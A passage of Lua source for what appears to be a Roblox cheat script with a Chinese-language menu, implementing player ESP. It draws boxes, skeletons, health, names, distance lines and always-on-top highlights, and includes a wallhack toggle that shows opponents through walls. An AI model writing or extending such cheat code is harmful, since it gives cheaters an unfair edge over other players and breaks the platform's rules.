                if espData.boxLines then
                    for _, line in ipairs(espData.boxLines) do
                        line.Visible = false
                    end
                end
                updateHighlight(player, Color3.new(1,1,1))
                updateGlow(player, Color3.new(1,1,1))
                return
            end
            
            local character = player.Character
            if not character then
                espData.box.Visible = false
                espData.headDot.Visible = false
                espData.healthText.Visible = false
                espData.nameText.Visible = false
                espData.distanceText.Visible = false
                espData.tracer.Visible = false
                for _, line in ipairs(espData.bonesLines) do
                    line.Visible = false
                end
                if espData.circle then espData.circle.Visible = false end
                if espData.boxLines then
                    for _, line in ipairs(espData.boxLines) do
                        line.Visible = false
                    end
                end
                return
            end
            
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            local headPart = character:FindFirstChild("Head")
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            
            if not rootPart or not humanoid then
                espData.box.Visible = false
                espData.headDot.Visible = false
                espData.healthText.Visible = false
                espData.nameText.Visible = false
                espData.distanceText.Visible = false
                espData.tracer.Visible = false
                for _, line in ipairs(espData.bonesLines) do
                    line.Visible = false
                end
                if espData.circle then espData.circle.Visible = false end
                if espData.boxLines then
                    for _, line in ipairs(espData.boxLines) do
                        line.Visible = false
                    end
                end
                return
            end
            
            local rootPos, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
            local headPos, _ = Camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 3, 0))
            local legPos, _ = Camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0))
            
            local distance = 0
            if LocalPlayer.Character then
                local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if localRoot then
                    distance = (localRoot.Position - rootPart.Position).Magnitude
                end
            end
            
            local espColor = getPlayerColor(player, humanoid, distance)
            
            updateGlow(player, espColor)
            updateHighlight(player, espColor)
            
            espData.box.Color = espColor
            espData.headDot.Color = espColor
            espData.healthText.Color = espColor
            espData.nameText.Color = espColor
            espData.distanceText.Color = espColor
            espData.tracer.Color = espColor
            
            if espData.circle then espData.circle.Color = espColor end
            if espData.boxLines then
                for _, line in ipairs(espData.boxLines) do
                    line.Color = espColor
                end
            end
            
            if _G.ESP.ShowBox and onScreen then
                local boxHeight = headPos.Y - legPos.Y
                local boxWidth = boxHeight * 0.5
                local centerX = rootPos.X
                local centerY = (headPos.Y + legPos.Y) / 2
                drawBox(espData, centerX, centerY, boxWidth, boxHeight, espColor)
            else
                espData.box.Visible = false
                if espData.circle then espData.circle.Visible = false end
                if espData.boxLines then
                    for _, line in ipairs(espData.boxLines) do
                        line.Visible = false
                    end
                end
            end
            
            if _G.ESP.ShowHealth and onScreen then
                espData.healthText.Position = Vector2.new(rootPos.X, rootPos.Y - espData.box.Size.Y / 2 - 20)
                espData.healthText.Text = "血量: " .. math.floor(humanoid.Health)
                espData.healthText.Visible = true
            else
                espData.healthText.Visible = false
            end
            
            if _G.ESP.ShowName and onScreen then
                espData.nameText.Position = Vector2.new(rootPos.X, rootPos.Y - espData.box.Size.Y / 2 - 40)
                espData.nameText.Text = "名字: " .. player.Name
                espData.nameText.Visible = true
            else
                espData.nameText.Visible = false
            end
            
            if _G.ESP.ShowDistance and onScreen and LocalPlayer.Character then
                local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if localRoot then
                    espData.distanceText.Position = Vector2.new(rootPos.X, rootPos.Y + espData.box.Size.Y / 2 + 20)
                    espData.distanceText.Text = "距离: " .. math.floor(distance) .. " 米"
                    espData.distanceText.Visible = true
                else
                    espData.distanceText.Visible = false
                end
            else
                espData.distanceText.Visible = false
            end
            
            if _G.ESP.ShowHeadDot and headPart and onScreen then
                local headPos2, _ = Camera:WorldToViewportPoint(headPart.Position)
                espData.headDot.Position = Vector2.new(headPos2.X, headPos2.Y)
                espData.headDot.Visible = true
            else
                espData.headDot.Visible = false
            end
            
            if _G.ESP.ShowBones and onScreen then
                for _, line in ipairs(espData.bonesLines) do
                    pcall(function() line:Remove() end)
                end
                espData.bonesLines = {}
                local newBones = drawBones(character, espColor)
                for _, line in ipairs(newBones) do
                    table.insert(espData.bonesLines, line)
                end
            else
                for _, line in ipairs(espData.bonesLines) do
                    line.Visible = false
                end
            end
            
            if _G.ESP.ShowTracer then
                local originPart = getTracerOrigin(player)
                if originPart then
                    local originPos, originOnScreen = Camera:WorldToViewportPoint(originPart.Position)
                    espData.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                    espData.tracer.To = Vector2.new(originPos.X, originPos.Y)
                    espData.tracer.Visible = originOnScreen
                else
                    espData.tracer.Visible = false
                end
            else
                espData.tracer.Visible = false
            end
        end)
        
        renderConnections[player] = renderConnection
    end
    
    local function cleanupPlayerESP(player)
        if highlights[player] then
            pcall(function() highlights[player]:Destroy() end)
            highlights[player] = nil
        end
        local character = player.Character
        if character then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                if pointLight then
                    pcall(function() pointLight:Destroy() end)
                end
            end
        end
        if renderConnections[player] then
            pcall(function() renderConnections[player]:Disconnect() end)
            renderConnections[player] = nil
        end
        if espObjects[player] then
            espObjects[player].active = false
            if espObjects[player].box then pcall(function() espObjects[player].box:Remove() end) end
            if espObjects[player].headDot then pcall(function() espObjects[player].headDot:Remove() end) end
            if espObjects[player].healthText then pcall(function() espObjects[player].healthText:Remove() end) end
            if espObjects[player].nameText then pcall(function() espObjects[player].nameText:Remove() end) end
            if espObjects[player].distanceText then pcall(function() espObjects[player].distanceText:Remove() end) end
            if espObjects[player].tracer then pcall(function() espObjects[player].tracer:Remove() end) end
            if espObjects[player].circle then pcall(function() espObjects[player].circle:Remove() end) end
            if espObjects[player].boxLines then
                for _, line in ipairs(espObjects[player].boxLines) do
                    pcall(function() line:Remove() end)
                end
            end
            if espObjects[player].bonesLines then
                for _, line in ipairs(espObjects[player].bonesLines) do
                    pcall(function() line:Remove() end)
                end
            end
            espObjects[player] = nil
        end
        if connections[player] then
            if connections[player].characterAdded then
                pcall(function() connections[player].characterAdded:Disconnect() end)
            end
            connections[player] = nil
        end
    end
    
    local function onCharacterAdded(player)
        return function()
            task.wait(0.5)
            if player ~= LocalPlayer then
                cleanupPlayerESP(player)
                createESP(player)
            end
        end
    end
    
    local function setupPlayer(player)
        if player == LocalPlayer then return end
        cleanupPlayerESP(player)
        createESP(player)
        if not connections[player] then
            connections[player] = {}
        end
        if connections[player].characterAdded then
            pcall(function() connections[player].characterAdded:Disconnect() end)
        end
        connections[player].characterAdded = player.CharacterAdded:Connect(onCharacterAdded(player))
    end
    
    local function refreshAllESP()
        cleanupHighlights()
        for player, _ in pairs(espObjects) do
            cleanupPlayerESP(player)
        end
        table.clear(espObjects)
        table.clear(renderConnections)
        table.clear(connections)
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                setupPlayer(player)
            end
        end
    end
    
    local function initializeESP()
        createPlayerCountText()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                setupPlayer(player)
            end
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        if player ~= LocalPlayer then
            task.wait(0.5)
            setupPlayer(player)
        end
    end)
    
    Players.PlayerRemoving:Connect(function(player)
        cleanupPlayerESP(player)
    end)
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        refreshAllESP()
    end)
    
    Camera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
        if playerCountText then
            playerCountText.Position = Vector2.new(Camera.ViewportSize.X / 2, 30)
        end
    end)
    
    initializeESP()
    
    _G.ESPFunctions = {
        cleanupHighlights = cleanupHighlights,
        cleanupPlayerESP = cleanupPlayerESP,
        setupPlayer = setupPlayer,
        refreshAllESP = refreshAllESP
    }
end)

run(function()
    local espSection = PIJIAOBEN:section("①透视玩家", false)
    
    espSection:Toggle("ESP总开关", "Enabled", false, function(Value)
        _G.ESP.Enabled = Value
        if not Value then
            _G.ESPFunctions.cleanupHighlights()
        end
    end)
    
    espSection:Dropdown('颜色模式', 'Color Mode', {"固定", "按血量", "按距离", "按队伍"}, function(value)
        _G.ESP.ColorMode = value
    end)
    
    espSection:Dropdown('方框样式', 'Box Style', {"矩形", "角框", "圆形"}, function(value)
        _G.ESP.BoxStyle = value
    end)
    
    espSection:Toggle("身体方框", "Box", false, function(Value)
        _G.ESP.ShowBox = Value
    end)
    
    espSection:Toggle("头部圆点", "Head Dot", false, function(Value)
        _G.ESP.ShowHeadDot = Value
    end)
    
    espSection:Toggle("血量", "Health", false, function(Value)
        _G.ESP.ShowHealth = Value
    end)
    
    espSection:Toggle("用户名", "Name", false, function(Value)
        _G.ESP.ShowName = Value
    end)
    
    espSection:Toggle("距离", "Distance", false, function(Value)
        _G.ESP.ShowDistance = Value
    end)
    
    espSection:Toggle("骨骼", "Bones", false, function(Value)
        _G.ESP.ShowBones = Value
        if Value then
            _G.ESPFunctions.refreshAllESP()
        end
    end)
    
    espSection:Toggle("天线", "Tracer", false, function(Value)
        _G.ESP.ShowTracer = Value
    end)
    
    espSection:Dropdown('天线起点', 'Tracer Origin', {"身体", "头部"}, function(value)
        _G.ESP.TracerOrigin = value
    end)
    
    espSection:Toggle("高亮显示", "Highlight", false, function(Value)
        _G.ESP.ShowHighlight = Value
        if not Value then
            _G.ESPFunctions.cleanupHighlights()
        end
    end)
    
    espSection:Toggle("发光效果", "Glow", false, function(Value)
        _G.ESP.ShowGlow = Value
        if not Value then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local character = player.Character
                    if character then
                        local rootPart = character:FindFirstChild("HumanoidRootPart")
                        if rootPart then
                            local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                            if pointLight then
                                pcall(function() pointLight:Destroy() end)
                            end
                        end
                    end
                end
            end
        end
    end)
    
    espSection:Toggle("显示人数", "Show Player Count", false, function(Value)
        _G.ESP.ShowPlayerCount = Value
    end)
    
    espSection:Dropdown('选择ESP颜色', 'ESP Color', {"红色","蓝色","黄色","绿色","青色","橙色","紫色","粉色","棕色","灰色","白色","黑色","彩色"}, function(value)
        _G.ESP.ESPColor = _G.ColorMap[value]
    end)
    
    espSection:Toggle("队伍检测", "Team check", false, function(Value)
        _G.ESP.TeamCheck = Value
    end)
    
    espSection:Toggle("墙壁检测", "Wall Check", false, function(Value)
        _G.ESP.WallCheck = Value
    end)
    
    espSection:Toggle("活体检测", "Alive Check", false, function(Value)
        _G.ESP.AliveCheck = Value
    end)
    
    espSection:Toggle("好友检测", "Friend Check", false, function(Value)
        _G.ESP.FriendCheck = Value
    end)
end)

local Feng = PIJIAOBEN:section("②透视玩家", false)

local run = function(func) func() end

run(function()
    _G.ColorPresets = {
        {"红", Color3.fromRGB(255, 0, 0)},
        {"绿", Color3.fromRGB(0, 255, 0)},
        {"蓝", Color3.fromRGB(0, 0, 255)},
        {"黄", Color3.fromRGB(255, 255, 0)},
        {"紫", Color3.fromRGB(128, 0, 128)},
        {"白", Color3.fromRGB(255, 255, 255)},
        {"黑", Color3.fromRGB(0, 0, 0)},
        {"橙", Color3.fromRGB(255, 165, 0)},
        {"青", Color3.fromRGB(0, 255, 255)},
        {"粉", Color3.fromRGB(255, 105, 180)},
        {"青绿", Color3.fromRGB(0, 255, 127)},
        {"金色", Color3.fromRGB(255, 215, 0)},
        {"银色", Color3.fromRGB(192, 192, 192)}
    }
    
    _G.GetColorByName = function(name)
        for _, preset in ipairs(_G.ColorPresets) do
            if preset[1] == name then
                return preset[2]
            end
        end
        return Color3.new(1, 1, 1)
    end
    
    _G.GetColorNames = function()
        local names = {}
        for _, preset in ipairs(_G.ColorPresets) do
            table.insert(names, preset[1])
        end
        return names
    end
end)

run(function()
    _G.ESPConfig = {
        Enabled = false,
        
        ShowName = false,
        ShowHealth = false,
        ShowDistance = false,
        ShowWeapon = false,
        ShowTeam = false,
        ShowBackpack = false,
        
        ShowTracer = false,
        TracerOrigin = "屏幕",
        TracerThickness = 3,
        TracerTransparency = 0.5,
        
        FillTransparency = 0.5,
        OutlineTransparency = 0.2,
        TextSize = 14,
        TextOutline = true,
        
        ColorMode = "队伍_红",
        RainbowSpeed = 1,
        
        MaxDistance = 2000,
        UseDistanceFade = true,
        
        WallCheck = false,
        AliveCheck = false,
        FriendCheck = false,
        
        HighlightEnabled = false,
        BoxOutlineEnabled = false,
        
        WallhackEnabled = false,
        
        ChamsEnabled = false,
        NameTagSize = 1.0,
        HealthBarEnabled = false,
        DistanceScale = false,
        
        UpdateRate = 30
    }
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    _G.ESPUtils = {
        GetPlayerWeapon = function(character)
            local tool = character:FindFirstChildOfClass("Tool")
            return tool and tool.Name or "无武器"
        end,
        
        GetPlayerBackpackWeapons = function(player)
            local weapons = {}
            if player:FindFirstChild("Backpack") then
                for _, tool in ipairs(player.Backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        table.insert(weapons, tool.Name)
                    end
                end
            end
            return #weapons > 0 and table.concat(weapons, ", ") or "无武器"
        end,
        
        isFriend = function(player)
            if not _G.ESPConfig.FriendCheck then return false end
            local success, isFriendResult = pcall(function()
                return LocalPlayer:IsFriendsWith(player.UserId)
            end)
            return success and isFriendResult
        end,
        
        isAlive = function(character)
            if not _G.ESPConfig.AliveCheck then return true end
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            if not humanoid then return false end
            return humanoid.Health > 0 and humanoid:GetState() ~= Enum.HumanoidStateType.Dead
        end,
        
        shouldShowESP = function(player, character)
            if not _G.ESPConfig.Enabled then return false end
            if player == LocalPlayer then return false end
            if _G.ESPConfig.FriendCheck and _G.ESPUtils.isFriend(player) then
                return false
            end
            if not _G.ESPUtils.isAlive(character) then
                return false
            end
            return true
        end,
        
        GetTeamInfo = function(player)
            if player.Team then
                return player.Team.Name
            else
                return "无队伍"
            end
        end,
        
        IsTeammate = function(player)
            return player.Team and LocalPlayer.Team and player.Team == LocalPlayer.Team
        end
    }
end)

run(function()
    local Workspace = game:GetService("Workspace")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Camera = workspace.CurrentCamera
    
    _G.WallCheck = {
        isWallBetween = function(character)
            if not _G.ESPConfig.WallCheck then return false end
            
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then return false end
            
            local myCharacter = LocalPlayer.Character
            if not myCharacter then return false end
            
            local rayOrigin = Camera.CFrame.Position
            local direction = (humanoidRootPart.Position - rayOrigin)
            local rayDistance = direction.Magnitude
            direction = direction.Unit
            
            local ignoreList = {myCharacter, character, Camera}
            
            for _, descendant in ipairs(character:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    table.insert(ignoreList, descendant)
                end
            end
            
            for _, descendant in ipairs(myCharacter:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    table.insert(ignoreList, descendant)
                end
            end
            
            local raycastParams = RaycastParams.new()
            raycastParams.FilterDescendantsInstances = ignoreList
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
            raycastParams.IgnoreWater = true
            
            local raycastResult = workspace:Raycast(rayOrigin, direction * rayDistance, raycastParams)
            
            return raycastResult ~= nil
        end,
        
        IsBehindWall = function(character)
            if not _G.ESPConfig.WallhackEnabled then return false end
            
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then return true end
            
            local ray = Ray.new(Camera.CFrame.Position, (humanoidRootPart.Position - Camera.CFrame.Position).Unit * 100)
            local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {Camera, LocalPlayer.Character, character})
            
            return part ~= nil
        end
    }
end)

run(function()
    _G.RainbowColor = {
        GetCurrentColor = function()
            local hue = (tick() * 0.5) % 1
            return Color3.fromHSV(hue, 1, 1)
        end
    }
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    _G.ColorCalculator = {
        CalculatePlayerColor = function(esp, humanoid, character, distance)
            return _G.ColorCalculator.CalculateColorByMode(esp.Player, humanoid, character, distance)
        end,
        
        CalculateColorByMode = function(player, humanoid, character, distance)
            local mode = _G.ESPConfig.ColorMode
            
            if mode == "彩虹" then
                return _G.RainbowColor.GetCurrentColor()
            end
            
            if mode == "队伍_红" or mode == "队伍_绿" or mode == "队伍_蓝" then
                local isTeammate = _G.ESPUtils.IsTeammate(player)
                
                if mode == "队伍_红" then
                    return isTeammate and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
                elseif mode == "队伍_绿" then
                    return isTeammate and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
                else
                    return isTeammate and Color3.fromRGB(100, 200, 255) or Color3.fromRGB(255, 100, 100)
                end
                
            elseif mode == "血量" then
                if humanoid and humanoid.MaxHealth > 0 then
                    local healthPercent = humanoid.Health / humanoid.MaxHealth
                    return Color3.new(2 * (1 - healthPercent), 2 * healthPercent, 0)
                end
                return Color3.new(1, 1, 1)
                
            elseif mode == "距离" then
                local distPercent = math.clamp(distance / _G.ESPConfig.MaxDistance, 0, 1)
                return Color3.fromHSV(distPercent * 0.7, 1, 1)
                
            elseif mode == "墙后" then
                local isBehindWall = _G.WallCheck.IsBehindWall(character)
                return isBehindWall and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)
                
            else
                return _G.GetColorByName(mode)
            end
        end,
        
        CalculateVisibility = function(distance, maxDistance)
            if distance > maxDistance then return 0 end
            local fadeStart = maxDistance * 0.8
            if distance > fadeStart then
                return 1 - ((distance - fadeStart) / (maxDistance - fadeStart))
            end
            return 1
        end
    }
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Camera = workspace.CurrentCamera
    local RunService = game:GetService("RunService")

    local TracerCache = {}
    local TracerConnections = {}
    local LastCleanupTime = 0

    _G.TracerModule = {
        GetTracerOrigin = function()
            if not Camera then 
                return Vector2.new(500, 500)
            end
            
            local viewportSize = Camera.ViewportSize
            local origin = Vector2.new(viewportSize.X / 2, viewportSize.Y)
            
            if _G.ESPConfig.TracerOrigin ~= "屏幕" and LocalPlayer.Character then
                local targetPart
                
                if _G.ESPConfig.TracerOrigin == "身体" then
                    targetPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or 
                                 LocalPlayer.Character:FindFirstChild("Torso")
                elseif _G.ESPConfig.TracerOrigin == "头部" then
                    targetPart = LocalPlayer.Character:FindFirstChild("Head")
                end
                
                if targetPart then
                    local success, screenPos = pcall(function()
                        return Camera:WorldToViewportPoint(targetPart.Position)
                    end)
                    
                    if success and screenPos and screenPos.Z > 0 then
                        origin = Vector2.new(
                            math.clamp(screenPos.X, 0, viewportSize.X),
                            math.clamp(screenPos.Y, 0, viewportSize.Y)
                        )
                    end
                end
            end
            
            return origin
        end,
        
        CreateTracer = function(player)
            if TracerCache[player] then 
                return TracerCache[player]
            end
            
            local success, tracer = pcall(function()
                local newTracer = Drawing.new("Line")
                newTracer.Visible = false
                newTracer.Color = Color3.new(1, 1, 1)
                newTracer.Thickness = _G.ESPConfig.TracerThickness
                newTracer.Transparency = _G.ESPConfig.TracerTransparency
                return newTracer
            end)
            
            if not success or not tracer then
                return nil
            end
            
            TracerCache[player] = tracer
            
            if not TracerConnections[player] then
                TracerConnections[player] = {}
                TracerConnections[player].Removing = player.AncestryChanged:Connect(function(_, parent)
                    if not parent then
                        _G.TracerModule.RemoveTracer(player)
                    end
                end)
            end
            
            return tracer
        end,
        
        RemoveTracer = function(player)
            local tracer = TracerCache[player]
            if tracer then
                pcall(function()
                    tracer.Visible = false
                    tracer:Remove()
                end)
                TracerCache[player] = nil
            end
            
            if TracerConnections[player] then
                for _, conn in pairs(TracerConnections[player]) do
                    pcall(function() conn:Disconnect() end)
                end
                TracerConnections[player] = nil
            end
        end,
        
        ShouldShowTracer = function(player)
            if not _G.ESPConfig.Enabled or not _G.ESPConfig.ShowTracer then
                return false
            end
            
            if not player or not player.Parent or player == LocalPlayer then
                return false
            end
            
            if not player.Character then
                return false
            end
            
            if _G.ESPConfig.AliveCheck then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if not humanoid or humanoid.Health <= 0 then
                    return false
                end
            end
            
            if _G.ESPConfig.FriendCheck and _G.ESPUtils.isFriend(player) then
                return false
            end
            
            return true
        end,
        
        GetTargetScreenPosition = function(player)
            if not player or not player.Character then
                return nil, false
            end
            
            local character = player.Character
            local targetPart
            
            if _G.ESPConfig.TracerOrigin == "身体" then
                targetPart = character:FindFirstChild("HumanoidRootPart") or 
                            character:FindFirstChild("Torso") or
                            character:FindFirstChild("Head")
            else
                targetPart = character:FindFirstChild("Head") or
                            character:FindFirstChild("HumanoidRootPart") or
                            character:FindFirstChild("Torso")
            end
            
            if not targetPart or not Camera then
                return nil, false
            end
            
            local success, screenPos = pcall(function()
                return Camera:WorldToViewportPoint(targetPart.Position)
            end)
            
            if not success or not screenPos then
                return nil, false
            end
            
            if screenPos.Z <= 0 then
                return nil, false
            end
            
            local viewportSize = Camera.ViewportSize
            local margin = 50
            
            local inView = (
                screenPos.X >= -margin and 
                screenPos.X <= viewportSize.X + margin and
                screenPos.Y >= -margin and 
                screenPos.Y <= viewportSize.Y + margin
            )
            
            return Vector2.new(screenPos.X, screenPos.Y), inView
        end,
        
        UpdateTracer = function(player)
            if not _G.TracerModule.ShouldShowTracer(player) then
                local tracer = TracerCache[player]
                if tracer then
                    tracer.Visible = false
                end
                return
            end
            
            local character = player.Character
            if not character then
                return
            end
            
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if not rootPart or not Camera then
                return
            end
            
            local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
            if distance > _G.ESPConfig.MaxDistance then
                local tracer = TracerCache[player]
                if tracer then
                    tracer.Visible = false
                end
                return
            end
            
            if _G.ESPConfig.WallCheck and not _G.ESPConfig.WallhackEnabled then
                if _G.WallCheck.IsBehindWall(character) then
                    local tracer = TracerCache[player]
                    if tracer then
                        tracer.Visible = false
                    end
                    return
                end
            end
            
            local tracer = TracerCache[player]
            if not tracer then
                tracer = _G.TracerModule.CreateTracer(player)
            end
            
            if not tracer then
                return
            end
            
            local targetPos, inView = _G.TracerModule.GetTargetScreenPosition(player)
            if not targetPos then
                tracer.Visible = false
                return
            end
            
            local fromPos = _G.TracerModule.GetTracerOrigin()
            
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            
            local tracerColor = _G.ColorCalculator.CalculateColorByMode(player, humanoid, character, distance)
            
            tracer.From = fromPos
            tracer.To = targetPos
            tracer.Color = tracerColor
            tracer.Thickness = _G.ESPConfig.TracerThickness
            tracer.Transparency = _G.ESPConfig.TracerTransparency
            tracer.Visible = inView
        end,
        
        CleanupTracers = function()
            for player, tracer in pairs(TracerCache) do
                pcall(function()
                    tracer.Visible = false
                    tracer:Remove()
                end)
            end
            TracerCache = {}
            
            for player, connections in pairs(TracerConnections) do
                for _, conn in pairs(connections) do
                    pcall(function() conn:Disconnect() end)
                end
            end
            TracerConnections = {}
        end,
        
        CleanupInvalidTracers = function()
            local currentTime = tick()
            if currentTime - LastCleanupTime < 3 then return end
            LastCleanupTime = currentTime
            
            for player, tracer in pairs(TracerCache) do
                if not player or not player.Parent or not player.Character then
                    _G.TracerModule.RemoveTracer(player)
                end
            end
        end,
        
        UpdateAllTracerTransparency = function()
            for player, tracer in pairs(TracerCache) do
                if tracer then
                    tracer.Transparency = _G.ESPConfig.TracerTransparency
                end
            end
        end,
        
        UpdateAllTracerColors = function()
            for player, tracer in pairs(TracerCache) do
                if tracer and tracer.Visible then
                    local character = player.Character
                    if character then
                        local rootPart = character:FindFirstChild("HumanoidRootPart")
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        if rootPart and Camera and humanoid then
                            local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
                            tracer.Color = _G.ColorCalculator.CalculateColorByMode(player, humanoid, character, distance)
                        end
                    end
                end
            end
        end,
        
        UpdateAllTracerThickness = function()
            for player, tracer in pairs(TracerCache) do
                if tracer then
                    tracer.Thickness = _G.ESPConfig.TracerThickness
                end
            end
        end,
        
        GetTracerCount = function()
            local count = 0
            for _, tracer in pairs(TracerCache) do
                if tracer and tracer.Visible then
                    count = count + 1
                end
            end
            return count
        end
    }
    
    local function InitializeTracers()
        Players.PlayerAdded:Connect(function(player)
            task.wait(1)
            if player ~= LocalPlayer then
                _G.TracerModule.CreateTracer(player)
            end
        end)
        
        Players.PlayerRemoving:Connect(function(player)
            _G.TracerModule.RemoveTracer(player)
        end)
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                _G.TracerModule.CreateTracer(player)
            end
        end
    end
    
    task.spawn(function()
        task.wait(1)
        InitializeTracers()
    end)
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Camera = workspace.CurrentCamera
    local RunService = game:GetService("RunService")
    
    local ESPCache = {}
    local LastUpdateTime = 0
    local PlayerConnections = {}
    
    local function CleanupESP(character)
        local esp = ESPCache[character]
        if esp then
            for _, conn in pairs(esp.Connections) do
                pcall(function() conn:Disconnect() end)
            end
            if esp.Highlight then
                pcall(function() esp.Highlight:Destroy() end)
            end
            if esp.Billboard then
                pcall(function() esp.Billboard:Destroy() end)
            end
            ESPCache[character] = nil
        end
    end
    
    local function CreateESP(character, player)
        if not character or not character.Parent then return false end
        if not player or not player.Parent then return false end
        if player == LocalPlayer then return false end
        if ESPCache[character] then return true end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        
        if not humanoid or not humanoidRootPart then
            local timeout = 0
            while timeout < 30 do
                task.wait(0.1)
                humanoid = character:FindFirstChildOfClass("Humanoid")
                humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                if humanoid and humanoidRootPart then break end
                timeout = timeout + 1
            end
            
            if not humanoid or not humanoidRootPart then
                return false
            end
        end
        
        if ESPCache[character] then return true end
        
        local esp = {
            Character = character,
            Player = player,
            Highlight = nil,
            Billboard = nil,
            HealthBar = nil,
            Connections = {}
        }
        
        local success, highlight = pcall(function()
            esp.Highlight = Instance.new("Highlight")
            esp.Highlight.Name = "ESP_Highlight"
            esp.Highlight.FillColor = Color3.new(1, 1, 1)
            esp.Highlight.OutlineColor = Color3.new(0, 0, 0)
            esp.Highlight.FillTransparency = _G.ESPConfig.FillTransparency
            esp.Highlight.OutlineTransparency = _G.ESPConfig.OutlineTransparency
            esp.Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            esp.Highlight.Enabled = _G.ESPConfig.Enabled and _G.ESPConfig.HighlightEnabled
            esp.Highlight.Parent = character
            return true
        end)
        
        if not success then
            esp.Highlight = nil
        end
        
        success, _ = pcall(function()
            esp.Billboard = Instance.new("BillboardGui")
            esp.Billboard.Name = "ESP_Billboard"
            esp.Billboard.AlwaysOnTop = true
            esp.Billboard.Size = UDim2.new(0, 200 * _G.ESPConfig.NameTagSize, 0, 60 * _G.ESPConfig.NameTagSize)
            esp.Billboard.StudsOffset = Vector3.new(0, 3, 0)
            esp.Billboard.Adornee = humanoidRootPart
            esp.Billboard.Enabled = _G.ESPConfig.Enabled
            esp.Billboard.MaxDistance = _G.ESPConfig.MaxDistance
            esp.Billboard.Parent = character
            
            local textLabel = Instance.new("TextLabel")
            textLabel.Name = "ESP_TextLabel"
            textLabel.BackgroundTransparency = 1
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.TextColor3 = Color3.new(1, 1, 1)
            textLabel.TextSize = _G.ESPConfig.TextSize * _G.ESPConfig.NameTagSize
            textLabel.Font = Enum.Font.SourceSansBold
            textLabel.TextStrokeTransparency = _G.ESPConfig.TextOutline and 0.5 or 1
            textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
            textLabel.Text = ""
            textLabel.ZIndex = 10
            textLabel.Parent = esp.Billboard
            
            if _G.ESPConfig.HealthBarEnabled then
                local healthBar = Instance.new("Frame")
                healthBar.Name = "ESP_HealthBar"
                healthBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
                healthBar.BorderSizePixel = 0
                healthBar.Size = UDim2.new(1, 0, 0, 4 * _G.ESPConfig.NameTagSize)
                healthBar.Position = UDim2.new(0, 0, 1, 0)
                healthBar.ZIndex = 11
                healthBar.Parent = esp.Billboard
                
                local healthFill = Instance.new("Frame")
                healthFill.Name = "ESP_HealthFill"
                healthFill.BackgroundColor3 = Color3.new(0, 1, 0)
                healthFill.BorderSizePixel = 0
                healthFill.Size = UDim2.new(1, 0, 1, 0)
                healthFill.ZIndex = 12
                healthFill.Parent = healthBar
                
                esp.HealthBar = healthFill
            end
        end)
        
        if not success then
            esp.Billboard = nil
            esp.HealthBar = nil
        end
        
        esp.Connections.CharacterRemoving = character.AncestryChanged:Connect(function(_, parent)
            if not parent then
                CleanupESP(character)
            end
        end)
        
        esp.Connections.RootPartChanged = character.ChildAdded:Connect(function(child)
            if child.Name == "HumanoidRootPart" or child:IsA("BasePart") then
                if esp.Billboard and not esp.Billboard.Adornee then
                    esp.Billboard.Adornee = child
                end
            end
        end)
        
        ESPCache[character] = esp
        
        if _G.ESPConfig.ShowTracer then
            _G.TracerModule.CreateTracer(player)
        end
        
        return true
    end
    
    local function UpdateESP()
        local currentTime = tick()
        if currentTime - LastUpdateTime < (1 / _G.ESPConfig.UpdateRate) then
            return
        end
        LastUpdateTime = currentTime
        
        _G.TracerModule.CleanupInvalidTracers()
        
        if _G.ESPConfig.Enabled then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local hasESP = false
                    for char, _ in pairs(ESPCache) do
                        if char == player.Character then
